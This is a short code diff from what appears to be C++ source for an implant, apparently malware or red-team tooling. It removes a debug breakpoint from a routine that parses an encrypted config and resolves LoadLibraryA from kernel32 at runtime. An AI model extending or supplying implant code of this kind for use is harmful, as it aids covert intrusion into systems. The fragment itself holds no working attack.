@@ -63,9 +63,9 @@ namespace Implant {
 
         //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);
 
-        __debugbreak();
         Ctx->LE     = Parser::UnpackByte(&Parser);
         Ctx->Root   = Parser::UnpackByte(&Parser);
+
         Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);
 
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
